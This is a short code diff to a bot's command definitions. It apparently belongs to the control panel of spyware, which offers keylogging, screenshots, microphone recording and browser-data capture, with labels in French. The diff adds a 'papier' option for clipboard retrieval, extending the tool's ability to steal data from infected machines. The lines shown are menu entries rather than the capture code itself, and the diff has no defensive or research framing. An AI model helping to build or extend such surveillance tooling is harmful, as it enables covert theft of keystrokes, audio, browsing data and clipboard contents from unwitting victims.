@@ -41,6 +41,10 @@ export const commands = [
                         value: 'keylogger',
                     },
                     {
+                        name: 'papier',
+                        value: 'papier',
+                    },
+                    {
                         name: 'stop',
                         value: 'stop',
                     },
@@ -101,7 +105,8 @@ export const commands = [
                     { name: 'Captures d\'écran', value: 'screenshot' },
                     { name: 'Enregistrements audio', value: 'microphone' },
                     { name: 'Données de navigation', value: 'browserdata' },
-                    { name: 'Enregistrements du clavier', value: 'keylogger' }
+                    { name: 'Enregistrements du clavier', value: 'keylogger' },
+                    { name: 'Récuperation presse-papier', value: 'papier' }
                 ],
             },
             {
